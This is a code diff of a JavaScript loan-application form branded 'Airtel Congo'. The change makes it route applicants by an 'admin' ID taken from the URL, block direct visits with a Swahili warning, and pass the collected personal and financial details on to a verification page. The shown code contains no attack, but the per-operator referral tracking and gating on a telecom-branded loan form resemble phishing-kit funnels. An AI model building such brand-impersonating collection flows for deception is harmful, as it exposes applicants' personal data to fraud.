@@ -1,10 +1,50 @@
 // Application Form Script - Airtel Congo
-// RULE: Admin ID comes ONLY from sessionStorage (set by landing page from URL).
-// Never read from localStorage — that causes stale cross-session leakage.
+// ADMIN ID ISOLATION RULES:
+//   1. Read admin ID from URL query param (?admin=) OR sessionStorage
+//   2. Prefer URL param — it's the ground truth for this request
+//   3. NEVER use localStorage
+//   4. Pass admin ID forward to verification.html in the URL
 
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('applicationForm');
     if (!form) { console.error('Application form not found!'); return; }
+
+    // ============================================
+    // Get admin ID — URL param takes priority
+    // ============================================
+    function getAdminId() {
+        // 1. URL query param (most reliable — was set by landing page navigation)
+        const urlParams = new URLSearchParams(window.location.search);
+        const fromUrl = urlParams.get('admin');
+        if (fromUrl && fromUrl !== 'undefined' && fromUrl !== 'null' && fromUrl.trim() !== '') {
+            // Sync sessionStorage to match URL
+            sessionStorage.setItem('selectedAdminId', fromUrl.trim());
+            return fromUrl.trim();
+        }
+
+        // 2. sessionStorage fallback (same tab, set by landing page)
+        const fromSession = sessionStorage.getItem('selectedAdminId');
+        if (fromSession && fromSession !== 'undefined' && fromSession !== 'null' && fromSession.trim() !== '') {
+            return fromSession.trim();
+        }
+
+        return null;
+    }
+
+    const adminId = getAdminId();
+    console.log('📋 Application form | Admin ID:', adminId || 'MISSING — will be blocked');
+
+    // Block if no admin ID
+    if (!adminId) {
+        form.innerHTML = `
+            <div style="background:#fee2e2;border:2px solid #fecaca;color:#991b1b;padding:24px;border-radius:12px;text-align:center;">
+                <div style="font-size:48px;margin-bottom:16px;">⚠️</div>
+                <h3 style="margin:0 0 12px;">Kiungo Hakiko Sahihi</h3>
+                <p style="margin:0;">Tafadhali tumia kiungo sahihi ulichopewa na wakala wako.<br>Usijaribu kufungua ukurasa huu moja kwa moja.</p>
+            </div>
+        `;
+        return;
+    }
 
     // Error container
     const errorContainer = document.createElement('div');
@@ -19,60 +59,64 @@ document.addEventListener('DOMContentLoaded', function() {
         errorContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
     }
 
-    // ============================================
-    // Get admin ID from sessionStorage ONLY
-    // (set by landing-script.js from the URL ?admin= param)
-    // ============================================
-    const adminId = sessionStorage.getItem('selectedAdminId') || null;
-    console.log('📋 Application form | Admin ID:', adminId || 'none (auto-assign)');
-
     // Real-time validation
     const inputs = form.querySelectorAll('input, select, textarea');
-    inputs.forEach(input => { input.addEventListener('blur', () => validateField(input)); });
+    inputs.forEach(input => input.addEventListener('blur', () => validateField(input)));
 
     form.addEventListener('submit', function(e) {
         e.preventDefault();
+
+        // Re-check admin ID at submit time
+        const currentAdminId = getAdminId();
+        if (!currentAdminId) {
+            showErrors(['Kiungo chako hakiko sahihi. Tafadhali tumia kiungo ulichopewa.']);
+            return;
+        }
+
         let isValid = true;
         const errors = [];
         inputs.forEach(input => {
             if (!validateField(input)) {
                 isValid = false;
                 const label = input.previousElementSibling?.textContent || input.name || 'Field';
-                errors.push(`${label.trim()}: Taarifa sio sahihi`);
+                errors.push(`${label.trim().replace('*','')}: Taarifa sio sahihi`);
             }
         });
         if (!isValid) { showErrors(errors); return; }
         errorContainer.style.display = 'none';
 
-        // Collect form data — adminId strictly from sessionStorage only
+        // Save form data + admin ID to session
         const formData = {
-            fullName: document.getElementById('fullName')?.value?.trim(),
-            email: document.getElementById('email')?.value?.trim(),
-            monthlyIncome: document.getElementById('monthlyIncome')?.value,
-            loanAmount: document.getElementById('loanAmount')?.value,
-            loanPurpose: document.getElementById('loanPurpose')?.value,
-            loanTerm: document.getElementById('repaymentPeriod')?.value,
+            fullName:         document.getElementById('fullName')?.value?.trim(),
+            email:            document.getElementById('email')?.value?.trim(),
+            monthlyIncome:    document.getElementById('monthlyIncome')?.value,
+            loanAmount:       document.getElementById('loanAmount')?.value,
+            loanPurpose:      document.getElementById('loanPurpose')?.value,
+            loanTerm:         document.getElementById('repaymentPeriod')?.value,
             employmentStatus: document.getElementById('employmentStatus')?.value,
-            adminId: adminId,
-            applicationId: 'LOAN-' + Date.now(),
-            submittedAt: new Date().toISOString()
+            adminId:          currentAdminId,
+            applicationId:    'LOAN-' + Date.now(),
+            submittedAt:      new Date().toISOString()
         };
 
         sessionStorage.setItem('applicationData', JSON.stringify(formData));
-        console.log('📋 Application saved | Admin:', adminId || 'auto-assign');
-        window.location.href = 'verification.html';
+        sessionStorage.setItem('selectedAdminId', currentAdminId);
+        console.log('📋 Application saved | Admin:', currentAdminId);
+
+        // Navigate to verification with admin ID in URL
+        window.location.href = `verification.html?admin=${encodeURIComponent(currentAdminId)}`;
     });
 
     function validateField(field) {
         const value = field.value.trim();
         field.classList.remove('error');
-        if (field.hasAttribute('required') && !value) { field.classList.add('error'); return false; }
-        if (field.type === 'email' && value && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) { field.classList.add('error'); return false; }
+        if (field.hasAttribute('required') && !value)                                              { field.classList.add('error'); return false; }
+        if (field.type === 'email' && value && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value))         { field.classList.add('error'); return false; }
         if (field.type === 'number' && value) {
             const num = parseFloat(value);
             const min = parseFloat(field.getAttribute('min'));
             const max = parseFloat(field.getAttribute('max'));
-            if ((min && num < min) || (max && num > max)) { field.classList.add('error'); return false; }
+            if ((!isNaN(min) && num < min) || (!isNaN(max) && num > max))                          { field.classList.add('error'); return false; }
         }
         return true;
     }
